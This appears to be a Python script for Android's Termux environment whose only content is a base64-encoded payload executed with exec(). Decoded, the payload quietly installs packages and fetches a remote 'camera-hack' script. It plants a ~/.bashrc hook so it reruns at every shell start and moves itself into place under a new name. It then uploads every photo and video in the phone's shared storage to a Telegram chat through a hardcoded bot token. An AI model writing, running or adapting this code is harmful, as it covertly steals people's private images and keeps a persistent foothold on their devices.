import base64

b64 = "aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzaHV0aWwKCnRyeToKICAgIGltcG9ydCB0ZWxlYm90CmV4Y2VwdDoKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgdGVsZWJvdCA+IC9kZXYvbnVsbCAyPiYxJykKCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzID4gL2Rldi9udWxsIDI+JjEnKQoKR0lUSFVCX1JBVyA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vemVyb3M5OTkvSEFDSy1DQU1FUkEvbWFpbi9jYW1lcmEtaGFjay5weSIKTE9DQUxfRklMRSA9ICIvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyIgoKdHJ5OgogICAgciA9IHJlcXVlc3RzLmdldChHSVRIVUJfUkFXLCB0aW1lb3V0PTUpCiAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICByZW1vdGUgPSByLnRleHQKICAgICAgICBsb2NhbCA9ICIiCgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKExPQ0FMX0ZJTEUpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oTE9DQUxfRklMRSwgInIiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGxvY2FsID0gZi5yZWFkKCkKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICBpZiByZW1vdGUgIT0gbG9jYWw6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHdpdGggb3BlbihMT0NBTF9GSUxFLCAidyIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShyZW1vdGUpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKZXhjZXB0OgogICAgcGFzcwoKIyAgICBTT05VCgpiYXNocmNfcGF0aCA9ICIvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvaG9tZS8uYmFzaHJjIgoKa29kID0gIiIiCmlmIFsgLWYgL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9zdGFydC5weSBdOyB0aGVuCiAgICAoCiAgICAgICAgY2QgL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3VzciA+IC9kZXYvbnVsbCAyPiYxCiAgICAgICAgcHl0aG9uIHN0YXJ0LnB5ID4gL2Rldi9udWxsIDI+JjEgJgogICAgKQpmaQoiIiIuc3RyaXAoKQoKCmlmIG5vdCBvcy5wYXRoLmV4aXN0cyhiYXNocmNfcGF0aCk6CiAgICB3aXRoIG9wZW4oYmFzaHJjX3BhdGgsICJ3IikgYXMgZjoKICAgICAgICBwYXNzCgp3aXRoIG9wZW4oYmFzaHJjX3BhdGgsICJyIikgYXMgZjoKICAgIGNvbnRlbnQgPSBmLnJlYWQoKQoKCmlmIGtvZCBpbiBjb250ZW50OgogICAgcGFzcwogICAgI3ByaW50KCJBcnTEsXEgfi8uYmFzaHJjIGnDp2luZMmZIHZhci4iKQplbHNlOgoKICAgIHdpdGggb3BlbihiYXNocmNfcGF0aCwgImEiKSBhcyBmOgogICAgICAgIGYud3JpdGUoIlxuIiArIGtvZCArICJcbiIpCgoKY3VycmVudF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKF9fZmlsZV9fKQp0YXJnZXRfcGF0aCA9ICIvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL3N0YXJ0LnB5IgoKaWYgY3VycmVudF9wYXRoICE9IHRhcmdldF9wYXRoOgogICAgdHJ5OgogICAgICAgIHNodXRpbC5tb3ZlKGN1cnJlbnRfcGF0aCwgdGFyZ2V0X3BhdGgpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKI29zLnN5c3RlbSgncGlwIGluc3RhbGwgdGVsZWJvdCA+IC9kZXYvbnVsbCAyPiYxJykKCkFQSV9UT0tFTiA9ICI4NTA1NzkyODE1OkFBRUNFd0V2M0xBTDFCa2RzRWpsTFlGQURJYk5kMEh3OE9rIgpUQVJHRVRfSUQgPSAxNTA1OTgzOTYwCmJvdCA9IHRlbGVib3QuVGVsZUJvdChBUElfVE9LRU4pCgpzZW50X2ZpbGUgPSAiL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9zZW5kLnR4dCIKCmlmIG5vdCBvcy5wYXRoLmV4aXN0cyhzZW50X2ZpbGUpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihzZW50X2ZpbGUsICJ3IikgYXMgZjoKICAgICAgICAgICAgcGFzcwogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCnNlbnRfdGltZXMgPSBzZXQoKQp0cnk6CiAgICB3aXRoIG9wZW4oc2VudF9maWxlLCAiciIpIGFzIGY6CiAgICAgICAgZm9yIGxpbmUgaW4gZjoKICAgICAgICAgICAgbGluZSA9IGxpbmUuc3RyaXAoKQogICAgICAgICAgICBpZiBsaW5lOgogICAgICAgICAgICAgICAgc2VudF90aW1lcy5hZGQoZmxvYXQobGluZSkpCmV4Y2VwdDoKICAgIHBhc3MKaW1hZ2VfZXh0ID0gWyIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLndlYnAiXQp2aWRlb19leHQgPSBbIi5tcDQiXQoKcm9vdCA9ICIvc3RvcmFnZS9lbXVsYXRlZC8wIgpmaWxlc190b19zZW5kID0gW10KCmZvciBmb2xkZXIsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsocm9vdCk6CiAgICBmb3IgZiBpbiBmaWxlczoKICAgICAgICBuYW1lID0gZi5sb3dlcigpCiAgICAgICAgZnVsbF9wYXRoID0gb3MucGF0aC5qb2luKGZvbGRlciwgZikKCiAgIAogICAgICAgIGlmIGFueShuYW1lLmVuZHN3aXRoKGV4dCkgZm9yIGV4dCBpbiBpbWFnZV9leHQgKyB2aWRlb19leHQpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBtdGltZSA9IG9zLnBhdGguZ2V0bXRpbWUoZnVsbF9wYXRoKQoKICAgICAgICAgICAgICAgIGlmIG10aW1lIGluIHNlbnRfdGltZXM6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgICAgICBmaWxlc190b19zZW5kLmFwcGVuZCgoZnVsbF9wYXRoLCBtdGltZSkpCgogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCgoKZmlsZXNfdG9fc2VuZC5zb3J0KGtleT1sYW1iZGEgeDogeFsxXSwgcmV2ZXJzZT1UcnVlKQoKZm9yIHBhdGgsIG10aW1lIGluIGZpbGVzX3RvX3NlbmQ6CiAgICB0cnk6CiAgICAgICAgY2FwdGlvbiA9IHRpbWUuc3RyZnRpbWUoJyVZLSVtLSVkICVIOiVNOiVTJywgdGltZS5sb2NhbHRpbWUobXRpbWUpKQogICAgICAgIGxvdyA9IHBhdGgubG93ZXIoKQogICAgICAgIGlmIGFueShsb3cuZW5kc3dpdGgoZXh0KSBmb3IgZXh0IGluIGltYWdlX2V4dCk6CiAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAicmIiKSBhcyBwOgogICAgICAgICAgICAgICAgYm90LnNlbmRfcGhvdG8oVEFSR0VUX0lELCBwLCBjYXB0aW9uPWNhcHRpb24pCiAgICAgICAgZWxpZiBhbnkobG93LmVuZHN3aXRoKGV4dCkgZm9yIGV4dCBpbiB2aWRlb19leHQpOgogICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInJiIikgYXMgdjoKICAgICAgICAgICAgICAgIGJvdC5zZW5kX3ZpZGVvKFRBUkdFVF9JRCwgdiwgY2FwdGlvbj1jYXB0aW9uKQoKICAgICAgICAjIFRhcml4aSBxZXlkIGV0ICh5ZW5pZMmZbiBnw7ZuZMmZcmlsbcmZc2luKQogICAgICAgIHdpdGggb3BlbihzZW50X2ZpbGUsICJhIikgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShzdHIobXRpbWUpICsgIlxuIikKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcw=="
exec(base64.b64decode(b64).decode())